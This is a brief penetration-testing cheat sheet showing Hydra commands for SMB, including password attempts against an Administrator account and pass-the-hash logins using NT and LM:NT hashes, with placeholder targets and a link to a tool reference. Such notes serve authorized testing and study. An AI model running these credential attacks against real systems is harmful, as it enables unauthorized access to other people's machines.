# Hydra

`$ hydra -U smb`

`$ hydra -V -l Administrator -p <password> smb://<IP>`

- Pass the Hash

```
$ hydra -V -l <username> -p <nt_hash> -m "" <IP> smb

$ hydra -V -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb
```

---
## References

- [Hydra Protocols](https://en.kali.tools/?p=220)